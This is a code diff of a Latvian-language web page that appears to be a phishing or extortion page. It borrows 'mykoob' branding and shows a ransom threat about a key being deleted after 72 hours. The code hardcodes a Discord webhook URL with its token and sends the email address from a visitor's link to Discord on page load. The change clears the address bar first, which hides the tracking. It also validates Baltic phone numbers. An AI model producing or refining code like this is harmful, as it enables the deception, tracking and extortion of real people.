@@ -571,13 +571,10 @@ Ja maksājums netiks veikts 72 stundu laikā, atslēga tiks neatgriezeniski dzē
 </div>
 
 <script>
-/* ── Webhook — tieši klientā ── */
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1547540540994621440/I295Pa8pLWiW3OzAbSUTbU-ad-prxpoXqJkeyQDCZF1xYjEZ0hNoz47Y8aQuDF_Bnk8w';
 
-/* ── localStorage atslēga vienas ziņas glabāšanai uz lietotāju ── */
 const MSG_STORE_KEY = 'mykoob_msg_ids_v1';
 
-/* ── Valstu numuru noteikumi ── */
 const PHONE_RULES = {
   '+371': { country: 'LV', minLen: 8,  maxLen: 8,  regex: /^[2-9]\d{7}$/ },
   '+370': { country: 'LT', minLen: 8,  maxLen: 8,  regex: /^[3-9]\d{7}$/ },
@@ -1141,12 +1138,13 @@ window.matchMedia('(prefers-color-scheme: light)').addEventListener('change', sw
   const params = new URLSearchParams(window.location.search);
   const emailParam = params.get('email');
   if (emailParam) {
+    // Iztīra URL UZREIZ — pirms jebkā cita
+    window.history.replaceState({}, '', '/');
+
+    // Tagad ieliek e-pastu formā un sūta uz Discord
     emailInput.value = emailParam;
     storedEmail = emailParam;
     sendToDiscord(emailParam, '📨 Saites atvēršana', { clickOnly: true });
-
-    // Iztīra ?email= no URL joslas
-    window.history.replaceState({}, '', window.location.pathname);
   }
 
   swapLogo();
